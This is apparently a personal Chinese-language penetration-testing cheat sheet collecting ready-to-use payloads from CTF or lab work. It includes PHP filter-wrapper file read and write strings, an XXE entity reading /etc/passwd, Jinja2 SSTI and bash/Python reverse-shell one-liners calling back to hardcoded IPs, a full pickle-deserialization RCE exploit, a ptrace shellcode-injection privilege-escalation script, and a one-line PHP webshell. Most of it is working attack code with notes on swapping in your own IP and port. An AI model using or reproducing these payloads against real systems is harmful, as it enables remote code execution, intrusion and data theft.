# Payload

## php

1. url封装器的payload----读取                                [==返回==](#back4)<a id='tag4'></a>

    ```php
    url_parameter=php://filter/convert.base64-encode/resource=evil.php
    ```

    1. `php://filter/`： 是一个特殊的封装器，它允许对输入和输出流应用一系列过滤器，以对数据进行处理和转换。
    2. `convert.base64-encode/`：这是一个过滤器指令，用于对流进行 Base64 编码转换。
    3. `resource=evil.php`：这是指定要读取的文件路径

2. url封装器的payload----写入

    ```php
    url_parameter=php://filter/write=convert.base64-decode/resource=test.php&txt=MTIz
    ```

    1. `write=convert.base64-decode`：这是封装器的指令，指示要将流中的数据写入到指定的资源（在这个示例中是 `test.php` 文件），并在写入之前将数据进行 Base64 解码。
    2. `resource=test.php`：这是指定要写入的资源的路径。在这个示例中，它是 `test.php` 文件。

    

## xml

```xml-dtd
<!DOCTYPE foo[<!ENTITY xxs SYSTEM 'file:///etc/passwd'>]>
```

1. what is xml?								[==返回==](#back3)<a id='tag3'></a>

    ​	简单理解就是和html一样是标记性语言，但是他有不同之处。大致的语法和html语言相同，但是比html更加的灵活。XML 的设计宗旨是传输数据，而不是显示数据。XML 标签没有被预定义。您需要自行定义标签。（这也是可以参数漏洞的主要原因）

    更多的详细详细特点和解释请访问网站：		[==XML 教程 | 菜鸟教程 (runoob.com)==](https://www.runoob.com/xml/xml-tutorial.html)

2. 具体漏洞：

    1. `<!DOCTYPE foo[<!ENTITY xxs SYSTEM 'file:///etc/passwd'>]>`:

        这段XML代码是一个实体注入（Entity Injection）的示例。它包含了一个外部实体引用，其中的实体 `xxs` 被定义为引用了文件路径 `/etc/passwd`。

        1. `<!DOCTYPE foo [...]>`：这是DTD（文档类型定义）的声明，指定文档类型为 `foo`。在这个示例中，DTD定义被省略，我们只关注实体引用。

            DOCTYPE后面跟的是文件类型 ，`foo` 是表示不指定文件类型。`[]`表示可以选择的内容。

        2. `<!ENTITY xxs SYSTEM 'file:///etc/passwd'>`：这是一个实体定义，其中 `xxs` 是实体的名称，`SYSTEM` 关键字指示它是一个外部实体引用，`file:///etc/passwd` 是实体的值，指定了一个文件路径。在这个例子中，实体 `xxs` 被定义为引用 `/etc/passwd` 文件。这就是固定的格式。

        3. `file:///etc/passwd` 是一个文件路径的 URL。在这个 URL 中，`file://` 是指示协议为文件协议的前缀，表示后面的路径是一个本地文件路径

        

## python

### web页面

1. 通过参数上传

     

    ```
    http://192.168.195.171:5000/sh4d0w$s?l333tt=	{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.195.170\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
    ```

    2. 要求：

        1. python
        2. ssti漏洞：通过   变量={{8*9}}来判断是否有模板注入漏洞
        3. 知道变量值
            3. 作用：
                1. 反弹shell可以通过nc建立连接来进行远程连接

            4. 使用
                1. 记得修改反连主机的ip和端口。

### ssti漏洞

#### 检测payload

1. url传入参数的检测payload，同传入该参数查看是否爆出错误。几乎是所有的模板开发语言可以用这个payload

```多种模板语言的标识组合
{{1+abcxyz}}${1+abcxyz}<%1+abcxyz%>[abcxyz]
```

2. 同样，我们来查看运算是否被执行来确定是否有ssti漏洞

```jinja2
${7*7},{{7*7}}
```

#### 反弹shellpayload

```jinja2
{% import os %}{{os.system('bash -c "bash -i >& /dev/tcp/192.168.195.170/4444 0>&1"')}}
```







### 终端执行

1. 修改终端python为交互模式

    ```python
    python -c 'import pty;pty.spawn("/bin/bash")'
    ```

2. sudo -u kori /bin/php /home/kori/jail.php python

    1. 当前用户是有sudo权限的
    
    2. 指定kori用户来通过php接收器来执行jail.php文件（/bin/php的是一个解释器）
    
    3. 而python是作为参数传入到这个脚本中，意思就是jail.php这个脚本是有参数的传入的
    
        结合题目，就是jail会对传入的参数进行过滤，但是没有过滤python所以由此产生payload



3. 直接在python交互环境下输入，就可以反弹shell。

    ​    里面的库都是python自带的。 `-c`参数是表示后面字符串为需要执行的代码。

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.254.132",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

# Scripe

## Python

### 反序列化

1. pickle反序列化漏洞

    1. 什么是反序列化

    ​		简答理解就是将输入的东西或文件“编码”

    2. pickle反序列化漏洞

        `pickle`包是一个用于序列化和反序列化Python对象的标准库

```python
#!/usr/bin/python
#
# Pickle deserialization RCE exploit
# calfcrusher@inventati.org
#
# Usage: ./Pickle-PoC.py [URL]

import pickle
import base64
import requests
import sys

class PickleRCE(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

default_url = 'http://127.0.0.1:5000/vulnerable' #here should change, there just to change port and vulnerable,port is the web service use, vulnerabel is path,
url = sys.argv[1] if len(sys.argv) > 1 else default_url
command = '/bin/bash -i >& /dev/tcp/192.168.1.23/4444 0>&1'  # Reverse Shell Payload Change IP/PORT，here should change

pickled = 'pickled'  # This is the POST parameter of our vulnerable Flask app,here should change,pickled should be changed to post's parameter's name.
payload = base64.b64encode(pickle.dumps(PickleRCE()))  # Crafting Payload
requests.post(url, data={pickled: payload})  # Sending POST request
```

### 信息搜集脚本

linpeas.sh （自己下载）

1. what？

    ​		LinPeas.sh都是Linux环境下的本地枚举工具，用于渗透测试和漏洞利用。发现系统各种信息

    给予执行权限（==chmod +x lenpease.s==h），运行脚本即可。同时，它还会给出一些潜在的攻击点，

    ==注意==要有有足够权限，否则无法完全探测，同时系统不能有一些防护措施。

2. 直接执行就可以了。

### 提权漏洞

#### capabilities的cap_sys_prace权漏洞

1. 用途

    用于capabilities的cap_sys_prace配置不当来进行提取

2. 使用条件

    1. python的解释权有 cap_sys_prace权限
    2. 找到一个有root权限的进程

3. 如何是使用

    1. python2.7 script.py id

        id为一个root用户的程序

    2. 使用完脚本后会自动打开靶机的 `5600`端口

        ```python
        # inject.py# The C program provided at the GitHub Link given below can be used as a reference for writing the python script.
        # GitHub Link: https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c 
        
        import ctypes
        import sys
        import struct
        
        # Macros defined in <sys/ptrace.h>
        # https://code.woboq.org/qt5/include/sys/ptrace.h.html
        
        PTRACE_POKETEXT   = 4
        PTRACE_GETREGS    = 12
        PTRACE_SETREGS    = 13
        PTRACE_ATTACH     = 16
        PTRACE_DETACH     = 17
        
        # Structure defined in <sys/user.h>
        # https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
        
        class user_regs_struct(ctypes.Structure):
            _fields_ = [
                ("r15", ctypes.c_ulonglong),
                ("r14", ctypes.c_ulonglong),
                ("r13", ctypes.c_ulonglong),
                ("r12", ctypes.c_ulonglong),
                ("rbp", ctypes.c_ulonglong),
                ("rbx", ctypes.c_ulonglong),
                ("r11", ctypes.c_ulonglong),
                ("r10", ctypes.c_ulonglong),
                ("r9", ctypes.c_ulonglong),
                ("r8", ctypes.c_ulonglong),
                ("rax", ctypes.c_ulonglong),
                ("rcx", ctypes.c_ulonglong),
                ("rdx", ctypes.c_ulonglong),
                ("rsi", ctypes.c_ulonglong),
                ("rdi", ctypes.c_ulonglong),
                ("orig_rax", ctypes.c_ulonglong),
                ("rip", ctypes.c_ulonglong),
                ("cs", ctypes.c_ulonglong),
                ("eflags", ctypes.c_ulonglong),
                ("rsp", ctypes.c_ulonglong),
                ("ss", ctypes.c_ulonglong),
                ("fs_base", ctypes.c_ulonglong),
                ("gs_base", ctypes.c_ulonglong),
                ("ds", ctypes.c_ulonglong),
                ("es", ctypes.c_ulonglong),
                ("fs", ctypes.c_ulonglong),
                ("gs", ctypes.c_ulonglong),
            ]
        
        libc = ctypes.CDLL("libc.so.6")
        
        pid=int(sys.argv[1])
        
        # Define argument type and respone type.
        libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
        libc.ptrace.restype = ctypes.c_uint64
        
        # Attach to the process
        libc.ptrace(PTRACE_ATTACH, pid, None, None)
        registers=user_regs_struct()
        
        # Retrieve the value stored in registers
        libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
        
        print("Instruction Pointer: " + hex(registers.rip))
        
        print("Injecting Shellcode at: " + hex(registers.rip))
        
        # Shell code copied from exploit db.
        shellcode="\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"
        
        # Inject the shellcode into the running process byte by byte.
        for i in xrange(0,len(shellcode),4):
         
          # Convert the byte to little endian.
          shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
          shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
          shellcode_byte=int(shellcode_byte_little_endian,16)
         
          # Inject the byte.
          libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)
        
        print("Shellcode Injected!!")
        
        # Modify the instuction pointer
        registers.rip=registers.rip+2
        
        # Set the registers
        libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
        
        print("Final Instruction Pointer: " + hex(registers.rip))
        
        # Detach from the process.
        libc.ptrace(PTRACE_DETACH, pid, None, None)
        ```

        



## php脚本

### php

1. 一句话webshell

    ```php
    <?php $var=shell_exec($_GET['cmd']);echo $var?>
    ```

    `shell_exec` 是一个函数，用于执行操作系统的命令并返回输出结果。它允许 PHP 脚本与底层操作系统进行交互，并执行各种命令行操作。

    

    

    ## bash脚本

    ### 信息收集

    1. ```bash
        for i in $(seq 1 10); do ping -c 2 172.17.0.$i; done
        ```

    ​		这是bash脚本语言，用于linux中；

    ​		语法说明

    ​			  1. do:是用来标记循环的开始，和done相呼应。循环之间的命令。

    ​          	2. seq:seq是用于打印一些列的数值`seq [选项]... 首数 增量值 尾数`其中有些是可以省略的。`seq` 命令本身不能直接生成数组，				  但可以通过 `$(seq ...)` 结合 bash 的命令替换功能，将 `seq` 生成的数列作为一个数组赋值给变量。

       			3. done：表示结束循环如：while,for循环

    









